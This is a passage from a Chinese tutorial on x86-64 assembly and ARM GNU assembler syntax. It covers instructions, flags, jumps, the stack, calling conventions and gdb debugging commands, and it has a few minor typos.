\u5b83\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58. \u8fd9\u4e2a\u6211\u4eec\u4e0a\u4e00\u8282\u8bb2\u4e86, \u8fd9\u91cc\u56de\u987e\u4e00\u4e0b. \u8bb8\u591a\u7b97\u672f\u6307\u4ee4\u7528\u4e8e\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u7c7b\u578b,\u4e5f\u5c31\u662f\u5e26\u7b26\u53f7\u52a0\u6cd5\u548c\u65e0\u7b26\u53f7\u52a0\u6cd5\u90fd\u4f7f\u7528\u76f8\u540c\u7684\u6307\u4ee4. \u5f53\u9700\u8981\u7684\u65f6\u5019, \u53c2\u6570\u8bbe\u7f6e\u7684\u6761\u4ef6\u4ee3\u7801\u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u4e0d\u540c\u7c7b\u578b\u7684\u6ea2\u51fa. add src, dst ;dst = dst + src sub src, dst ;dst = dst - src imul src, dst ;dst = dst * src neg dst ;dst = -dst ( \u7b97\u672f\u53d6\u53cd ) and src, dst ;dst = dst & src or src, dst ;dst = dst | src xor src, dst ;dst = dst ^ src not dst ;dst = ~dst ( \u6309\u4f4d\u53d6\u53cd ) shl count, dst ;dst <<= count ( \u6309 count \u7684\u503c\u6765\u5de6\u79fb ), \u8ddf\u8fd9\u4e2a\u76f8\u540c\u7684\u662f`sal`\u6307\u4ee4 sar count, dst ;dst = count ( \u6309 count \u7684\u503c\u6765\u7b97\u672f\u53f3\u79fb ) shr count, dst ;dst = count ( \u6309 count \u7684\u503c\u6765\u903b\u8f91\u53f3\u79fb ) ;\u67d0\u4e9b\u6307\u4ee4\u6709\u7279\u6b8a\u60c5\u51b5\u53d8\u4f53, \u8fd9\u4e9b\u53d8\u4f53\u6709\u4e0d\u540c\u7684\u53c2\u6570 imul src ;\u4e00\u4e2a\u53c2\u6570\u7684 imul \u6307\u4ee4\u5047\u5b9a %rax \u4e2d\u5176\u4ed6\u53c2\u6570\u8ba1\u7b97 128 \u4f4d\u7684\u7ed3\u679c, \u5728 %rdx \u4e2d\u5b58\u50a8\u9ad8 64 \u4f4d, \u5728 %rax \u4e2d\u5b58\u50a8\u4f4e 64 \u4f4d. shl dst ;dst <<= 1 ( \u540e\u9762\u6ca1\u6709 count \u53c2\u6570\u7684\u65f6\u5019\u9ed8\u8ba4\u662f\u79fb\u52a8 1 \u4f4d, `sar`, `shr`, `sal` \u6307\u4ee4\u4e5f\u662f\u4e00\u6837 ) \u8fd9\u4e9b\u6307\u4ee4\u4e0a\u4e00\u8282\u90fd\u8bb2\u8fc7, \u8fd9\u91cc\u7a0d\u5fae\u63d0\u4e00\u4e0b. \u6d41\u7a0b\u63a7\u5236\u6307\u4ee4 \u6709\u4e00\u4e2a\u7279\u6b8a\u7684 %eflags \u5bc4\u5b58\u5668, \u5b83\u5b58\u7740\u4e00\u7ec4\u88ab\u79f0\u4e3a\u6761\u4ef6\u4ee3\u7801\u7684\u5e03\u5c14\u6807\u5fd7. \u5927\u591a\u6570\u7684\u7b97\u672f\u8fd0\u7b97\u4f1a\u66f4\u65b0\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801. \u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\u8bfb\u53d6\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801\u4e4b\u540e, \u518d\u786e\u5b9a\u662f\u5426\u6267\u884c\u76f8\u5e94\u7684\u5206\u652f\u6307\u4ee4. \u6761\u4ef6\u4ee3\u7801\u5305\u62ec ZF( \u96f6\u6807\u5fd7 ), SF( \u7b26\u53f7\u6807\u5fd7 ), OF( \u6ea2\u51fa\u6807\u5fd7, \u6709\u7b26\u53f7 ) \u548c CF( \u8fdb\u4f4d\u6807\u5fd7, \u65e0\u7b26\u53f7 ). \u4f8b\u5982, \u5982\u679c\u7ed3\u679c\u4e3a 0 , \u5219\u8bbe\u7f6e ZF, \u5982\u679c\u64cd\u4f5c\u6ea2\u51fa ( \u8fdb\u5165\u7b26\u53f7\u4f4d ), \u5219\u8bbe\u7f6e OF. \u8fd9\u4e9b\u6307\u4ee4\u4e00\u822c\u662f\u5148\u6267\u884c cmp \u6216 test \u64cd\u4f5c\u6765\u8bbe\u7f6e\u6807\u5fd7, \u7136\u540e\u518d\u8ddf\u8df3\u8f6c\u6307\u4ee4\u53d8\u91cf, \u8be5\u53d8\u91cf\u8bfb\u53d6\u6807\u5fd7\u6765\u786e\u5b9a\u662f\u91c7\u7528\u5206\u652f\u4ee3\u7801\u8fd8\u662f\u7ee7\u7eed\u4e0b\u4e00\u6761\u4ee3\u7801. cmp \u6216 test \u7684\u53c2\u6570\u662f\u7acb\u5373\u6570, \u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ( \u6700\u591a\u53ea\u6709\u4e00\u4e2a\u5185\u5b58\u53c2\u6570 ). \u6761\u4ef6\u8df3\u8f6c\u6709 32 \u4e2d\u53d8\u4f53, \u5176\u4e2d\u51e0\u79cd\u6548\u679c\u662f\u4e00\u6837\u7684. \u4e0b\u9762\u662f\u4e00\u4e9b\u5206\u652f\u6307\u4ee4. cmpl op2, op1 ;\u8fd0\u7b97\u7ed3\u679c = op1 - op2, \u4e22\u5f03\u7ed3\u679c\u7136\u540e\u8bbe\u7f6e\u6761\u4ef6\u4ee3\u7801 test op2, op1 ;\u8fd0\u7b97\u7ed3\u679c = op1 & op2, \u4e22\u5f03\u7ed3\u679c\u7136\u540e\u8bbe\u7f6e\u6761\u4ef6\u4ee3\u7801 jmp target ;\u65e0\u6761\u4ef6\u8df3\u8dc3 je target ;\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jz, \u5373jump zero ( ZF = 1 ) jne target ;\u4e0d\u76f8\u7b49\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnz, \u5373 jump non zero ( ZF = 0 ) jl target ;\u5c0f\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnge, \u5373 jump not greater or equal ( SF != OF ) jle target ;\u5c0f\u4e8e\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jng, \u5373 jump not greater ( ZF = 1 or SF != OF ) jg target ;\u5927\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnle, \u5373 jump not less or equal ( ZF = 0 and SF = OF ) jge target ;\u5927\u4e8e\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnl, \u5373 jump not less ( SF = OF ) ja target ;\u8df3\u5230\u4e0a\u9762, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnbe, \u5373 jump not below or equal ( CF = 0 and ZF = 0 ) jb target ;\u8df3\u5230\u4e0b\u9762, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnae, \u5373 jump not above or equal ( CF = 1 ) js target ;SF = 1 \u65f6\u8df3\u8dc3 jns target ;SF = 0 \u65f6\u8df3\u8dc3 \u5176\u5b9e\u4f60\u4e5f\u4f1a\u53d1\u73b0\u8fd9\u91cc\u5927\u90e8\u5206\u4e0a\u4e00\u8282\u90fd\u8bb2\u8fc7, \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u518d\u6765\u4e00\u904d\u5de9\u56fa\u4e00\u4e0b. setx \u548c movx \u8fd8\u6709\u4e24\u4e2a\u6307\u4ee4\u5bb6\u65cf\u53ef\u4ee5 \u8bfb\u53d6/\u54cd\u5e94 \u5f53\u524d\u7684\u6761\u4ef6\u4ee3\u7801. setx \u6307\u4ee4\u6839\u636e\u6761\u4ef6 x \u7684\u72b6\u6001\u5c06\u76ee\u6807\u5bc4\u5b58\u5668\u8bbe\u7f6e\u4e3a 0 \u6216 1. cmovx \u6307\u4ee4\u6839\u636e\u6761\u4ef6 x \u662f\u5426\u6210\u7acb\u6765\u6709\u6761\u4ef6\u5730\u6267\u884c mov. x \u662f\u4efb\u4f55\u6761\u4ef6\u53d8\u91cf\u7684\u5360\u4f4d\u7b26, \u5c31\u662f\u8bf4 x \u53ef\u4ee5\u7528\u8fd9\u4e9b\u6765\u4ee3\u66ff : e, ne, s, ns. \u5b83\u4eec\u7684\u610f\u601d\u4e0a\u9762\u4e5f\u90fd\u8bf4\u8fc7\u4e86. sete dst ;\u6839\u636e \u96f6/\u76f8\u7b49( zero/equal ) \u6761\u4ef6\u6765\u628a dst \u8bbe\u7f6e\u6210 0 \u6216 1 setge dst ;\u6839\u636e \u5927\u4e8e/\u76f8\u7b49( greater/equal ) \u6761\u4ef6\u6765\u628a dst \u8bbe\u7f6e\u6210 0 \u6216 1 cmovns src, dst ;\u5982\u679c ns \u6761\u4ef6\u6210\u7acb, \u5219\u7ee7\u7eed\u6267\u884c mov cmovle src, dst ;\u5982\u679c le \u6761\u4ef6\u6210\u7acb, \u5219\u7ee7\u7eed\u6267\u884c mov \u5bf9\u4e8e setx \u6307\u4ee4, \u5176\u76ee\u6807\u5fc5\u987b\u662f\u5355\u5b57\u8282\u5bc4\u5b58\u5668 ( \u4f8b\u5982 %al \u7528\u4e8e %rax \u7684\u4f4e\u5b57\u8282 ). \u5bf9\u4e8e cmovx \u6307\u4ee4, \u5176\u6765\u6e90\u548c\u53bb\u8def\u90fd\u5fc5\u987b\u662f\u5bc4\u5b58\u5668. \u51fd\u6570\u8c03\u7528\u4e0e\u6808 %rsp \u5bc4\u5b58\u5668\u7528\u4f5c \" \u6808\u6307\u9488 \"; push \u548c pop \u7528\u4e8e\u6dfb\u52a0\u6216\u8005\u5220\u9664\u6808\u5185\u5b58\u4e2d\u7684\u503c. push \u6307\u4ee4\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u8fd9\u4e2a\u53c2\u6570\u662f\u7acb\u5373\u6570\u5e38\u6570, \u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143. push \u6307\u4ee4\u5148\u628a %rsp \u7684\u503c\u9012\u51cf, \u7136\u540e\u5c06\u53c2\u6570\u590d\u5236\u5230\u6808\u5185\u5b58\u4e0a\u7684 tompost. pop \u6307\u4ee4\u4e5f\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u5373\u76ee\u6807\u5bc4\u5b58\u5668. pop \u5148\u628a\u6808\u5185\u5b58\u6700\u9876\u5c42\u7684\u503c\u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668, \u7136\u540e\u628a %rsp \u9012\u589e. \u76f4\u63a5\u8c03\u6574 %rsp, \u4ee5\u901a\u8fc7\u5355\u4e2a\u53c2\u6570\u6dfb\u52a0\u6216\u5220\u9664\u6574\u4e2a\u6570\u7ec4\u6216\u53d8\u91cf\u96c6\u5408\u4e5f\u662f\u53ef\u4ee5\u7684. \u4f46\u6ce8\u610f, \u6808\u5185\u5b58\u662f\u671d\u4e0b\u589e\u957f ( \u5373\u671d\u5411\u8f83\u4f4e\u5730\u5740 ). push %rbx ;\u628a %rbx \u5165\u6808 pushq $0x3 ;\u628a\u7acb\u5373\u6570 3 \u5165\u6808 sub $0x10, %rsp ;\u8c03\u6574\u6808\u6307\u9488\u4ee5\u7a7a\u51fa 16 \u5b57\u8282 pop %rax ;\u628a\u6808\u4e2d\u6700\u9876\u5c42\u7684\u503c\u51fa\u6808\u5230\u5bc4\u5b58\u5668 %rax \u4e2d add $0x10, %rsp ;\u8c03\u6574\u6808\u6307\u9488\u4ee5\u5220\u9664\u6700\u9876\u5c42\u7684 16 \u4e2a\u5b57\u8282 \u51fd\u6570\u4e4b\u95f4\u662f\u901a\u8fc7\u4e92\u76f8\u8c03\u7528\u8fd4\u56de\u6765\u4e92\u76f8\u63a7\u5236\u7684. callq \u6307\u4ee4\u6709\u4e00\u4e2a\u53c2\u6570, \u5373\u88ab\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740. \u5b83\u5c06\u8fd4\u56de\u6765\u7684\u5730\u5740\u5165\u6808, \u8fd9\u4e2a\u8fd4\u56de\u6765\u7684\u5730\u5740\u5373 %rip \u5f53\u524d\u7684\u503c, \u4e5f\u5373\u662f\u8c03\u7528\u51fd\u6570\u540e\u7684\u4e0b\u4e00\u6761\u6307\u4ee4. \u7136\u540e\u8fd9\u4e2a\u6307\u4ee4\u8ba9\u7a0b\u5e8f\u8df3\u8f6c\u5230\u88ab\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740. retq \u6307\u4ee4\u628a\u521a\u624d\u5165\u6808\u7684\u5730\u5740\u7ed9\u51fa\u6808, \u8ba9\u5b83\u56de\u5230 %rip \u4e2d, \u4ece\u800c\u8ba9\u7a0b\u5e8f\u5728\u4fdd\u5b58\u7684\u8fd4\u56de\u5730\u5740\u5904\u91cd\u65b0\u5f00\u59cb, \u5c31\u662f\u8bf4\u4f60\u4e2d\u9014\u8df3\u5230\u522b\u7684\u5730\u65b9\u53bb, \u4f60\u56de\u6765\u7684\u65f6\u5019\u8981\u4ece\u4f60\u8df3\u7684\u90a3\u4e2a\u5730\u65b9\u91cd\u65b0\u5f00\u59cb. \u5f53\u7136, \u4f60\u5982\u679c\u8981\u8bbe\u7f6e\u8fd9\u79cd\u51fd\u6570\u95f4\u7684\u4e92\u76f8\u8c03\u7528, \u8c03\u7528\u8005\u9700\u8981\u5c06\u524d\u516d\u4e2a\u53c2\u6570\u653e\u5165\u5bc4\u5b58\u5668 %rdi, %rsi, %rdx, %rcx, %r8 \u548c %r9 ( \u4efb\u4f55\u5176\u5b83\u53c2\u6570\u90fd\u5165\u6808 ), \u7136\u540e\u518d\u6267\u884c\u8c03\u7528\u6307\u4ee4. mov $0x3, %rdi ;\u7b2c\u4e00\u4e2a\u53c2\u6570\u5728 %rdi \u4e2d mov $0x7, %rsi ;\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5728 %rsi \u4e2d callq binky ;\u628a\u7a0b\u5e8f\u4ea4\u7ed9 binky \u63a7\u5236 \u5f53\u88ab\u8c03\u7528\u8005\u90a3\u4e2a\u51fd\u6570\u5b8c\u4e8b\u7684\u65f6\u5019, \u8fd9\u4e2a\u51fd\u6570\u5c06\u8fd4\u56de\u503c ( \u5982\u679c\u6709\u7684\u8bdd ) \u5199\u5165 %rax, \u7136\u540e\u6e05\u7406\u6808\u5185\u5b58, \u5e76\u4f7f\u7528 retq \u6307\u4ee4\u628a\u7a0b\u5e8f\u63a7\u5236\u6743\u4ea4\u8fd8\u7ed9\u8c03\u7528\u8005. mov $0x0, %eax ;\u5c06\u8fd4\u56de\u503c\u5199\u5165 %rax add $0x10, %rsp ;\u6e05\u7406\u6808\u5185\u5b58 retq ;\u4ea4\u8fd8\u63a7\u5236\u6743, \u8df3\u56de\u53bb \u8fd9\u4e9b\u5206\u652f\u8df3\u8f6c\u6307\u4ee4\u7684\u76ee\u6807\u901a\u5e38\u662f\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\u7684\u7edd\u5bf9\u5730\u5740. \u4f46\u662f, \u6709\u4e9b\u60c5\u51b5\u4e0b\u76f4\u5230\u8fd0\u884c\u7a0b\u5e8f\u7684\u65f6\u5019, \u6211\u4eec\u624d\u77e5\u9053\u76ee\u6807\u7684\u7edd\u5bf9\u5185\u5b58\u5730\u5740. \u4f8b\u5982\u7f16\u8bd1\u4e3a\u8df3\u8f6c\u8868\u7684 switch \u8bed\u53e5\u6216\u8c03\u7528\u51fd\u6570\u6307\u9488\u65f6. \u5bf9\u4e8e\u8fd9\u4e9b, \u6211\u4eec\u5148\u8ba1\u7b97\u76ee\u6807\u5730\u5740, \u7136\u540e\u628a\u5730\u5740\u5b58\u5230\u5bc4\u5b58\u5668\u4e2d, \u7136\u540e\u7528 \u5206\u652f/\u8c03\u7528( branch/call ) \u53d8\u91cf je *%rax \u6216 callq *%rax \u4ece\u6307\u5b9a\u5bc4\u5b58\u5668\u4e2d\u8bfb\u53d6\u76ee\u6807\u5730\u5740. \u5f53\u7136\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5, \u5c31\u662f\u4e0a\u4e00\u8282\u8bb2\u7684\u6253\u6807\u7b7e. 3.4.5 \u6c47\u7f16\u548c gdb \u8c03\u8bd5\u5668 ( debugger ) \u6709\u8bb8\u591a\u529f\u80fd, \u8fd9\u53ef\u4ee5\u8ba9\u4f60\u53ef\u4ee5\u5728\u7a0b\u5e8f\u4e2d\u8ffd\u8e2a\u548c\u8c03\u8bd5\u4ee3\u7801. \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u5176\u540d\u79f0\u4e0a\u52a0\u4e2a $ \u6765\u6253\u5370\u5bc4\u5b58\u5668\u4e2d\u7684\u503c, \u6216\u8005\u4f7f\u7528\u547d\u4ee4 info reg \u8f6c\u50a8\u6240\u6709\u5bc4\u5b58\u5668\u7684\u503c : (gdb) p $rsp (gdb) info reg disassemble \u547d\u4ee4\u6309\u7167\u540d\u79f0\u6253\u5370\u51fd\u6570\u7684\u53cd\u6c47\u7f16. x \u547d\u4ee4\u652f\u6301 i \u683c\u5f0f, \u8fd9\u4e2a\u683c\u5f0f\u628a\u5185\u5b58\u5730\u5740\u7684\u5185\u5bb9\u89e3\u91ca\u4e3a\u7f16\u7801\u6307\u4ee4 ( \u89e3\u7801 ). (gdb) disassemble main //\u53cd\u6c47\u7f16, \u7136\u540e\u6253\u5370\u6240\u6709 main \u51fd\u6570\u7684\u6307\u4ee4 (gdb) x/8i main //\u53cd\u6c47\u7f16, \u7136\u540e\u6253\u5370\u5f00\u59cb\u7684 8 \u6761\u6307\u4ee4 \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u51fd\u6570\u4e2d\u7684\u76f4\u63a5\u5730\u5740\u6216\u504f\u79fb\u91cf\u4e3a\u7279\u5b9a\u6c47\u7f16\u6307\u4ee4\u8bbe\u7f6e\u65ad\u70b9. (gdb) b *0x08048375 (gdb) b *main+7 //\u5728 main+7\u4e2a\u5b57\u8282\u8fd9\u91cc\u8bbe\u7f6e\u65ad\u70b9 \u4f60\u53ef\u4ee5\u7528 stepi \u548c nexti \u547d\u4ee4\u6765\u8ba9\u7a0b\u5e8f\u901a\u8fc7\u6307\u4ee4 ( \u800c\u4e0d\u662f\u6e90\u4ee3\u7801 ) \u5f80\u524d\u6267\u884c. (gdb) stepi (gdb) nexti 3.5 ARM\u6c47\u7f16\u57fa\u7840 3.5.1 \u5f15\u8a00 \u672c\u7ae0\u6240\u8bb2\u8ff0\u7684\u662f\u5728 GNU \u6c47\u7f16\u7a0b\u5e8f\u4e0b\u7684 ARM \u6c47\u7f16\u5feb\u901f\u6307\u5357\uff0c\u800c\u6240\u6709\u7684\u4ee3\u7801\u793a\u4f8b\u90fd\u4f1a\u91c7\u7528\u4e0b\u9762\u7684\u7ed3\u6784\uff1a [< \u6807\u7b7e label :] {<\u6307\u4ee4 instruction or directive } @ \u6ce8\u91ca comment \u5728 GNU \u7a0b\u5e8f\u4e2d\u4e0d\u9700\u8981\u7f29\u8fdb\u6307\u4ee4\u3002\u7a0b\u5e8f\u7684\u6807\u7b7e\u662f\u7531\u5192\u53f7\u8bc6\u522b\u800c\u4e0e\u6240\u5904\u7684\u4f4d\u7f6e\u65e0\u5173\u3002 \u5c31\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\uff1a .section .text, \"x\" .global add @\u7ed9\u7b26\u53f7\u6dfb\u52a0\u5916\u90e8\u94fe\u63a5 add: ADD r0, r0, r1 @\u6dfb\u52a0\u8f93\u5165\u53c2\u6570 MOV pc, lr @\u4ece\u5b50\u7a0b\u5e8f\u8fd4\u56de @\u7a0b\u5e8f\u7ed3\u675f \u5b83\u5b9a\u4e49\u7684\u662f\u4e00\u4e2a\u8fd4\u56de\u603b\u548c\u51fd\u6570 \u201c add \u201d\uff0c\u5141\u8bb8\u4e24\u4e2a\u8f93\u5165\u53c2\u6570\u3002\u901a\u8fc7\u4e86\u89e3\u8fd9\u4e2a\u7a0b\u5e8f\u5b9e\u4f8b\uff0c\u60f3\u5fc5\u63a5\u4e0b\u6765\u8fd9\u7c7b\u7a0b\u5e8f\u7684\u7406\u89e3\u6211\u4eec\u4e5f\u80fd\u591f\u5f88\u597d\u7684\u7684\u638c\u63e1\u3002 3.5.2 ARM \u7684 GNU \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4\u8868 \u5728 GNU \u6c47\u7f16\u7a0b\u5e8f\u4e0b\u7684 ARM \u6307\u4ee4\u96c6\u6db5\u62ec\u5982\u4e0b\uff1a GUN \u6c47\u7f16\u7a0b\u5e8f\u6307\u4ee4 \u63cf\u8ff0 .ascii \"<string>\" \u5c06\u5b57\u7b26\u4e32\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d .asciz \"<string>\" \u4e0e .ascii \u7c7b\u4f3c\uff0c\u4f46\u8ddf\u968f\u5b57\u7b26\u4e32\u7684\u96f6\u5b57\u8282 .balign <power_of_2> {,<fill_value>{,<max_padding>} } \u5c06\u5730\u5740\u4e0e <power_of_2> \u5b57\u8282\u5bf9\u9f50\u3002 \u6c47\u7f16\u7a0b\u5e8f\u901a\u8fc7\u6dfb\u52a0\u503c <fill_value> \u7684\u5b57\u8282\u6216\u5408\u9002\u7684\u9ed8\u8ba4\u503c\u6765\u5bf9\u9f50. \u5982\u679c\u9700\u8981\u8d85\u8fc7 <max_padding> \u8fd9\u4e2a\u6570\u5b57\u6765\u586b\u5145\u5b57\u8282\uff0c\u5219\u4e0d\u4f1a\u53d1\u751f\u5bf9\u9f50\uff08 \u7c7b\u4f3c\u4e8earmasm \u4e2d\u7684 ALIGN \uff09 .byte <byte1> {,<byte2> } \u2026 \u5c06\u4e00\u4e2a\u5b57\u8282\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d .code <number_of_bits> \u4ee5\u4f4d\u4e3a\u5355\u4f4d\u8bbe\u7f6e\u6307\u4ee4\u5bbd\u5ea6\u3002 \u4f7f\u7528 16 \u8868\u793a Thumb\uff0c32 \u8868\u793a ARM \u7a0b\u5e8f\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 CODE16 \u548c CODE32 \uff09 .else \u4e0e.if\u548c .endif \u4e00\u8d77\u4f7f\u7528\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 ELSE \uff09 .end \u6807\u8bb0\u7a0b\u5e8f\u6587\u4ef6\u7684\u7ed3\u5c3e\uff08 \u901a\u5e38\u7701\u7565 \uff09 .endif \u7ed3\u675f\u6761\u4ef6\u7f16\u8bd1\u4ee3\u7801\u5757 - \u53c2\u89c1.if\uff0c.ifdef\uff0c.ifndef\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 ENDIF \uff09 .endm \u7ed3\u675f\u5b8f\u5b9a\u4e49 - \u8bf7\u53c2\u9605 .macro\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEND \uff09 .endr \u7ed3\u675f\u91cd\u590d\u5faa\u73af - \u53c2\u89c1 .rept \u548c .irp\uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 WEND \uff09 .equ <symbol name>, <vallue> \u8be5\u6307\u4ee4\u8bbe\u7f6e\u7b26\u53f7\u7684\u503c\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 EQU \uff09 .err \u8fd9\u4e2a\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u505c\u6b62\u5e76\u51fa\u73b0\u9519\u8bef .exitm \u4e2d\u9014\u9000\u51fa\u4e00\u4e2a\u5b8f - \u53c2\u89c1 .macro\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEXIT \uff09 .global <symbol> \u8be5\u6307\u4ee4\u7ed9\u51fa\u7b26\u53f7\u5916\u90e8\u94fe\u63a5\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MEXIT \uff09\u3002 .hword <short1> {,<short2> }... \u5c0616\u4f4d\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u4e2d\uff08 \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 DCW \uff09 .if <logical_expression> \u628a\u4e00\u6bb5\u4ee3\u7801\u53d8\u6210\u524d\u63d0\u6761\u4ef6\u3002 \u4f7f\u7528 .endif \u7ed3\u675f\u4ee3\u7801\u5757\uff08 \u7c7b\u4f3c\u4e8e armasm\u4e2d\u7684 IF \uff09\u3002 \u53e6\u89c1 .else .ifdef <symbol> \u5982\u679c\u5b9a\u4e49\u4e86 <symbol> \uff0c\u5219\u5305\u542b\u4e00\u6bb5\u4ee3\u7801\u3002 \u7ed3\u675f\u4ee3\u7801\u5757\u7528 .endif, \u8fd9\u5c31\u662f\u4e2a\u6761\u4ef6\u5224\u65ad\u561b, \u5f88\u7b80\u5355\u7684. .ifndef <symbol> \u5982\u679c\u672a\u5b9a\u4e49 <symbol> \uff0c\u5219\u5305\u542b\u4e00\u6bb5\u4ee3\u7801\u3002 \u7ed3\u675f\u4ee3\u7801\u5757\u7528 .endif, \u540c\u4e0a. .include \"<filename>\" \u5305\u62ec\u6307\u5b9a\u7684\u6e90\u6587\u4ef6, \u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 INCLUDE \u6216 C \u4e2d\u7684#include .irp <param> {,<val 1>} {,<val_2>} ... \u4e3a\u503c\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u503c\u91cd\u590d\u4e00\u6b21\u4ee3\u7801\u5757\u3002 \u4f7f\u7528 .endr \u6307\u4ee4\u6807\u8bb0\u5757\u7684\u7ed3\u5c3e\u3002 \u5728\u91cc\u9762\u91cd\u590d\u4ee3\u7801\u5757\uff0c\u4f7f\u7528 \\<param> \u66ff\u6362\u5173\u8054\u7684\u4ee3\u7801\u5757\u503c\u5217\u8868\u4e2d\u7684\u503c\u3002 .macro <name> {<arg_1>} {,< arg_2>} ... {,<arg_N>} \u4f7f\u7528 N \u4e2a\u53c2\u6570\u5b9a\u4e49\u540d\u4e3a <name> \u7684\u6c47\u7f16\u7a0b\u5e8f\u5b8f\u3002\u5b8f\u5b9a\u4e49\u5fc5\u987b\u4ee5 .endm \u7ed3\u5c3e\u3002 \u8981\u5728\u8f83\u65e9\u7684\u65f6\u5019\u4ece\u5b8f\u4e2d\u9003\u8131\uff0c\u8bf7\u4f7f\u7528 .exitm \u3002 \u8fd9\u4e9b\u6307\u4ee4\u662f\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 MACRO\uff0cMEND \u548cMEXIT\u3002 \u4f60\u5fc5\u987b\u5728\u865a\u62df\u5b8f\u53c2\u6570\u524d\u9762\u52a0 \\ . .rept <number_of_times> \u91cd\u590d\u7ed9\u5b9a\u6b21\u6570\u7684\u4ee3\u7801\u5757\u3002 \u4ee5 .endr \u7ed3\u675f\u3002 <register_name> .req <register_name> \u8be5\u6307\u4ee4\u547d\u540d\u4e00\u4e2a\u5bc4\u5b58\u5668\u3002 \u5b83\u4e0e armasm \u4e2d\u7684 RN \u6307\u4ee4\u7c7b\u4f3c\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u60a8\u5fc5\u987b\u5728\u53f3\u4fa7\u63d0\u4f9b\u540d\u79f0\u800c\u4e0d\u662f\u6570\u5b57\uff08\u4f8b\u5982\uff0c acc .req r0 \uff09 .section <section_name> {,\"<flags> \"} \u542f\u52a8\u65b0\u7684\u4ee3\u7801\u6216\u6570\u636e\u90e8\u5206\u3002 GNU \u4e2d\u6709\u8fd9\u4e9b\u90e8\u5206: .text \u4ee3\u7801\u90e8\u5206; .data \u521d\u59cb\u5316\u6570\u636e\u90e8\u5206\u548c .bss \u672a\u521d\u59cb\u5316\u6570\u636e\u90e8\u5206\u3002 \u8fd9\u4e9b\u90e8\u5206\u6709\u9ed8\u8ba4\u503cflags\u548c\u94fe\u63a5\u5668\u7406\u89e3\u9ed8\u8ba4\u540d\u79f0\uff08\u4e0earmasm\u6307\u4ee4AREA\u7c7b\u4f3c\u7684\u6307\u4ee4\uff09\u3002 \u4ee5\u4e0b\u662f ELF \u683c\u5f0f\u6587\u4ef6\u5141\u8bb8\u7684 .section\u6807\u5fd7\uff1a a \u8868\u793a allowable section w \u8868\u793a writable section x \u8868\u793a executable section .set <variable_name>, <variable_value> \u8be5\u6307\u4ee4\u8bbe\u7f6e\u53d8\u91cf\u7684\u503c\u3002 \u5b83\u7c7b\u4f3c\u4e8e SETA\u3002 .space <number_of_bytes> {,<fill_byte> } \u4fdd\u7559\u7ed9\u5b9a\u7684\u5b57\u8282\u6570\u3002 \u5982\u679c\u6307\u5b9a\u4e86\u5b57\u8282\uff0c\u5219\u586b\u5145\u96f6\u6216 <fill_byte> \uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 SPACE\uff09 .word <word1> {,<word2>}... \u5c06 32 \u4f4d\u5b57\u503c\u5217\u8868\u4f5c\u4e3a\u6570\u636e\u63d2\u5165\u5230\u7a0b\u5e8f\u96c6\u4e2d\uff08\u7c7b\u4f3c\u4e8e armasm \u4e2d\u7684 DCD\uff09\u3002 3.5.3 \u5bc4\u5b58\u5668\u540d\u79f0 \u901a\u7528\u5bc4\u5b58\u5668\uff1a %r0 - %r15 fp \u5bc4\u5b58\u5668\uff1a %f0 - %f7 \u4e34\u65f6\u5bc4\u5b58\u5668\uff1a %r0 - %r3, %r12 